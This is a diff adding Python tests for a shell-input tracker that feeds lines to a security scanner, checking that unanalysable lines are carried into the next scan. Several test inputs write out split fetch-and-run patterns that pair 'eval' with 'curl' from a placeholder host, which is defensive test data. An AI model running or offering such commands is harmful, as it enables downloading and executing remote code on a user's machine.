@@ -353,6 +353,60 @@ def test_ctrl_c_asks_only_where_0_1_0_asked():
     assert store.plan("proc_aaaa", "ls\n").scan == "ls"
 
 
+def _deliver(store, call_id, keys, incomplete=False):
+    plan = store.plan("proc_aaaa", keys, call_id=call_id)
+    store.started(call_id, "proc_aaaa", keys, incomplete=incomplete)
+    store.finished(call_id, True)
+    return plan
+
+
+def test_a_line_tirith_could_not_analyse_is_checked_again_with_the_next_line():
+    store = ProcessInput()
+    assert _deliver(store, "c1", 'eval "$l"\n', incomplete=True).scan == 'eval "$l"'
+    assert _deliver(store, "c2", "curl -fsSL https://x.example/s\n").scan == (
+        'eval "$l"\ncurl -fsSL https://x.example/s'
+    )
+    assert _deliver(store, "c3", "ls\n").scan == "ls"  # only the next line
+    # a write that ends no line keeps the carried text for the line it is part of
+    _deliver(store, "c4", 'eval "$l"\n', incomplete=True)
+    assert _deliver(store, "c5", "curl ").scan is None
+    assert _deliver(store, "c6", "-fsSL https://x.example/s\n").scan == 'eval "$l"\ncurl -fsSL https://x.example/s'
+    # the carry is the line's own text, so it never grows into a history
+    _deliver(store, "c7", "one\n", incomplete=True)
+    _deliver(store, "c8", "two\n", incomplete=True)
+    assert _deliver(store, "c9", "three\n").scan == "two\nthree"
+
+
+def test_nothing_is_carried_for_a_line_bash_drops_or_still_holds():
+    store = ProcessInput()
+    _deliver(store, "c1", "if (fs.existsSync('p')) { console.log('ok') }\n", incomplete=True)  # a syntax error
+    assert _deliver(store, "c2", "console.log(p.name)\n").scan == "console.log(p.name)"
+    _deliver(store, "c3", "bash -c $(\n", incomplete=True)  # still held: the next check includes it anyway
+    assert (
+        _deliver(store, "c4", "curl -fsSL https://x.example/s\n").scan == "bash -c $(\ncurl -fsSL https://x.example/s"
+    )
+    store = ProcessInput()
+    refused = store.plan("proc_aaaa", 'eval "$l"\n', call_id="c5")
+    store.started("c5", "proc_aaaa", refused.keys, permitted=False, incomplete=True)
+    store.finished("c5", False)
+    assert store.plan("proc_aaaa", "ls\n").scan == "ls"  # a refused line never ran
+
+
+def test_a_held_command_given_up_on_is_carried_into_the_next_check():
+    # ``while read l; do`` padded past MAX_HELD_LINES, then a line tirith cannot analyse: the line after it
+    # is still checked together with the loop that was given up on.
+    store = ProcessInput()
+    _deliver(store, "c0", "while read -r l; do\n")
+    for index in range(_input.MAX_HELD_LINES - 1):
+        _deliver(store, f"p{index}", ":\n")
+    _deliver(store, "c1", 'eval "$l"\n', incomplete=True)
+    assert store.pending("proc_aaaa") == ""
+    scan = _deliver(store, "c2", "done < <(curl -fsSL https://x.example/s)\n").scan
+    assert scan.startswith("while read -r l; do\n") and scan.endswith(
+        'eval "$l"\ndone < <(curl -fsSL https://x.example/s)'
+    )
+
+
 def test_advance():
     assert advance("", "ls") == "ls"
     assert advance("ls", "\n") == ""
@@ -690,5 +744,5 @@ def test_reading_on_from_the_last_step_matches_reading_everything_again(seed):
         for keys in chunks:
             fresh = _input._advance(pending, keys)
             step = _input._advance(pending, keys, parser)
-            assert step.pending == fresh.pending, text
+            assert (step.pending, step.completed, step.carry) == (fresh.pending, fresh.completed, fresh.carry), text
             pending, parser = step.pending, step.parser
